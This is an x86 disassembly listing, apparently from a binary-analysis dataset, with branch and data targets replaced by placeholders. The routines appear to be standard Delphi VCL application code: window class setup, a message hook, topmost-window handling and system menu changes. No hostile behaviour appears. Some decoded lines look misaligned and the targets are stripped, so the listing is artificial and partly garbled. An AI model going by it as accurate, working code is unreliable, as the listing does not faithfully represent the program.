mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_4549d0
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41cd28
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41cd28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45262c
cmp [ rw-data ] 0x0
je r-xdata
sub_452664
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_4526c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_452800 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_452874
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_451fcc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4139f4
mov dl [ ebp - 0x1 ]
call sub_4526c4
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_451fb8
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413898
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413a70
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4139f4
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_452664
test al al
je r-xdata
inc esi
sub_4529c0
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_451fcc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_451fb8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_452a18
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_4529c0
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_452a92
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_452874
pop ecx
push ebp
mov al 0x2
call sub_452874
pop ecx
push ebp
mov al 0x3
call sub_452874
pop ecx
push ebp
mov al 0x4
call sub_452874
pop ecx
push ebp
mov al 0x5
call sub_452874
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
sub_452aa0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_452634
xor eax eax
push ebp
push sub_452b19
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45263c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_452b34
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403eb4
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f08
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_452b8c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_452bbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_454fd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_452be0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_433308
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_455054
sub_452c3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4540f4
sub_452c80
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_452c3c
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_452be0
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_452cf4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_452d50
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_452d80
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_452da8
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_452d50
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_452d80
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_452d80
sub_452de8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419cdc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403404
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4544c0
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_421b44
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_421f14
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_454c58
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c0dc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4546b8
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c104
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_40840c
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404124
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_454e34
mov eax ebx
call sub_4557f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4530f0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_452fd1
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_455808
mov [ esp + 0x4 ] esi
mov [ esp ] sub_4544c0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_4546b8
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_455054
xor edx edx
mov eax esi
call sub_4549d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
push esi
push sub_453524
mov eax esi
call sub_4542ac
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054f0
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4030f8
mov eax [ esi + 0x90 ]
call sub_4030f8
mov eax [ esi + 0x98 ]
call sub_4030f8
test bl bl
jle r-xdata
call sub_41ae04
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4530f0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_453291
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453298
lea eax [ ebp - 0x2c ]
call sub_403eb4
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_453670
call sub_41ad6c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404374
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406834
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403eb4
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_453d74
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_453d74
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_4532a0
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_451fd4
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_453300
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413898
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43b290
cmp ebx eax
je r-xdata
sub_453370
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_453300
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4139f4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_453488
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4139f4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_453524
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c3a4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4524e0
mov eax [ rw-data ]
call sub_452b28
sub_45357c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4535d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4535e0
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4040ac
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4535e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_453624
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453d74
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_453670
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_453d2a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453524
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_454790
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4139f4
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
